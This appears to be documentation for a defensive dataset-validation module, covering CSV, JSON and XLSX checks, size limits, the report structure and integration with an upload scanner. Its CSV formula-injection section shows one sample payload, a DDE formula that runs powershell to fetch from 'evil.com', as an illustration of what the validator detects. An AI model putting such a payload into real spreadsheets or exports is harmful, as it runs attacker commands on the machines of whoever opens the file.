# Dataset Validation

## Why Validate Dataset Structure?

Extension and MIME validation confirm the file *format*. Structure validation confirms the file is a *valid, usable dataset* — not a corrupted file, a disguised binary, or a malformed document designed to crash the parser.

Malformed datasets can:
- Exhaust server memory (deeply nested JSON, unbounded rows)
- Crash CSV parsers (mismatched quoting, binary content)
- Execute formulas when opened in spreadsheets (CSV injection)
- Trigger unexpected behavior in AI/ML pipelines

---

## CSV Validation

### What Gets Checked

| Check | Rule | Severity |
|---|---|---|
| Null bytes | File contains `\x00` → binary file, not CSV | `high` |
| Decodable | File must be valid UTF-8 (with replacement) | `high` |
| Non-empty | File must have at least one row | `medium` |
| Has headers | First row must have ≥ 1 non-empty column | `medium` |
| Column limit | ≤ 500 columns | `high` |
| Row limit | ≤ 500,000 rows | `high` |
| Row consistency | All rows must have the same column count | `medium` |
| Formula injection | Cells starting with `= + - @ \t \r` | `high` |

### CSV Formula Injection (OWASP CWE-1236)

CSV cells starting with `=`, `+`, `-`, `@`, `\t`, or `\r` are treated as **formulas** by spreadsheet applications (Excel, Google Sheets, LibreOffice Calc). A malicious user can upload:

```csv
name,command
Bob,=cmd|' /C powershell wget evil.com'!A1
```

When an analyst opens this CSV in Excel, the formula executes. The DatasetValidator catches these prefixes and adds a `formula_injection` finding. The file is then quarantined by the UploadScanner.

---

## JSON Validation

### What Gets Checked

| Check | Rule | Severity |
|---|---|---|
| Valid syntax | Must parse without `JSONDecodeError` | `medium` |
| Root type | Must be `dict` or `list` (not string/int/null) | `medium` |
| Nesting depth | ≤ 10 levels deep | `high` |
| Total key count | ≤ 10,000 keys (all nested) | `high` |

### Why Limit JSON Depth?

Deeply nested JSON is a **denial-of-service vector**. Parsing `{"a": {"a": {"a": ...}}}` at 1000 levels of nesting can exhaust the Python call stack. The 10-level depth limit prevents this.

### Why Limit Key Count?

A JSON file with 100,000 keys requires 100,000 dict insertions to parse — disproportionate memory use for what should be a dataset. The 10,000 key limit bounds memory consumption.

---

## XLSX Validation

### What Gets Checked

| Check | Rule | Severity |
|---|---|---|
| Readable workbook | `openpyxl.load_workbook()` must succeed | `medium` |
| Has sheets | Workbook must have ≥ 1 sheet | `medium` |
| Sheet limit | ≤ 50 sheets | `high` |
| Row limit | ≤ 500,000 rows in active sheet | `high` |

### Note on XLSX and openpyxl

XLSX validation requires `openpyxl`. If not installed, XLSX files pass structure validation with a warning — the MIME check still blocks non-XLSX binary files.

```bash
pip install openpyxl
```

---

## Validation Result Structure

```python
from guards.dataset_validator import DatasetValidator, DatasetValidationReport

dv     = DatasetValidator()
report = dv.validate(Path("data.csv"), ".csv")

print(report.valid)            # True / False
print(report.format)           # "csv" | "json" | "xlsx"
print(report.row_count)        # number of data rows
print(report.column_count)     # number of columns
print(report.columns)          # ["name", "age", "salary"]
print(report.findings)         # list of StructureFinding objects
print(report.rejection_reason) # first finding's detail (or "")

# Each finding:
for f in report.findings:
    print(f.check)    # "formula_injection" | "column_consistency" | etc.
    print(f.row)      # row index (-1 for column-level checks)
    print(f.column)   # column name
    print(f.detail)   # human-readable description
    print(f.severity) # UploadSeverity value
```

---

## Integration with Upload Scanner

Structure validation (Layer 4) does **not** quarantine files by itself — it returns a report. The UploadScanner (Layer 5) receives this report and makes the quarantine decision.

Flow:
```
DatasetValidator → DatasetValidationReport
                          │
                          ▼
               UploadScanner.scan_file()
                          │
              ┌───────────┴────────────┐
              │ Pass A: Dangerous      │  Pass B: Injection
              │ content patterns       │  (DatasetScanner)
              └───────────┬────────────┘
                          │
                          ▼
                  ContentScanReport
                          │
                          ▼
                QuarantineManager.route()
```

---

## Limits Configuration

All limits are in `configs/upload_settings.py`:

```python
CSV_MAX_COLUMNS    = 500
CSV_MAX_ROWS       = 500_000
JSON_MAX_DEPTH     = 10
JSON_MAX_KEYS      = 10_000
XLSX_MAX_SHEETS    = 50
XLSX_MAX_ROWS      = 500_000
CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
```

Change any limit here — no code changes needed in the validation modules.
